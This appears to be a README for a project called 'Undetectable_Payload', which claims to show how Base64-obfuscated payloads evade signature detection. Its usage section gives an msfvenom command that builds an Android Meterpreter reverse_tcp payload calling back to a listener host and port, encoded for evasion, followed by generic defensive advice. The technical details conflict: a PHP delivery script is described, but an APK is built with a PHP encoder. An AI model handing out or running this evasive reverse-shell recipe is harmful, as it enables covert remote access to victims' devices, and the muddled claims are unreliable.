# Undetectable_Payload

This project demonstrates the creation of an **obfuscated payload** using **Kali Linux**, **PHP**, and **Base64 encoding** techniques. The goal is to explore how payloads can bypass simple signature-based detection methods, and to raise awareness of the need for stronger security measures.

## üîß How It Works

The payload uses:
- **PHP** as the delivery script
- **Base64** encoding for obfuscation
- **Kali Linux tools** (`msfvenom`) to generate and serve the payload

The final PHP script is encoded and optionally includes multi-layer obfuscation to evade basic detection.

## üöÄ Usage

> You must run these commands in a controlled, isolated, and authorized environment.

### Generate the undectable payload
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.187.132 LPORT=4444 -o test.apk -e php/base64
````

### Run a private window
```bash
 firefox --private-window
````

## üõ°Ô∏è Recommendations

This project illustrates:

* The ease of bypassing naive security measures
* The importance of behavioral analysis over static signature detection
* Why layered security (IDS/IPS + behavioral + endpoint security) is crucial
